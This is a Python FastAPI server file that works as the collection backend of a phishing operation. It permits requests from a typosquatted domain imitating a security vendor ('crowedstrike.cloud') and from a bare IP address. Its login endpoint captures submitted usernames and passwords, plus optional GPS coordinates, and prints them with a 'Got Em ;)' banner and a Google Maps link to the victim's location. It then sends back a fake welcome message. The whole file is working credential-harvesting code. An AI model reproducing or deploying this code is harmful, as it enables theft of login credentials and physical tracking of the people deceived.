from fastapi import FastAPI
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
from typing import Optional, Dict

app = FastAPI()

origins = [
    "http://localhost",
    "http://localhost:8080",
    "http://127.0.0.1",
    "http://127.0.0.1:8080",
    "http://89.43.33.169:8080",
    "http://crowedstrike.cloud",
    "https://crowedstrike.cloud",
    "http://www.crowedstrike.cloud",
    "https://www.crowedstrike.cloud",
    "http://api.crowedstrike.cloud",
    "https://api.crowedstrike.cloud"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Nested model for coordinates
class Coordinates(BaseModel):
    latitude: float
    longitude: float

# Main credentials model
class Credentials(BaseModel):
    username: str
    password: str
    coords: Optional[Coordinates] = None

print('[+] Azdash Gimbtul')

@app.post("/")
async def login(credentials: Credentials):
    if credentials.coords:
        print('')
        print('[!] Got Em ;)')
        print("[+] Username:", credentials.username)
        print("[+] Password:", credentials.password)
        print("[+] Latitude:", credentials.coords.latitude)
        print("[+] Longitude:", credentials.coords.longitude)
        mapsLink = f'https://www.google.com/maps/search/?api=1&query={credentials.coords.latitude},{credentials.coords.longitude}'
        print("[+] Google Maps:", mapsLink)
        print('')
    else:
        print('')
        print("[-] Client Declined Location Services")
        print("[+] Username:", credentials.username)
        print("[+] Password:", credentials.password)
        print('')
    
    return {"message": f"Welcome, {credentials.username}!"}

@app.get("/abc")
def no_work():
    return {"message": "No Work"}
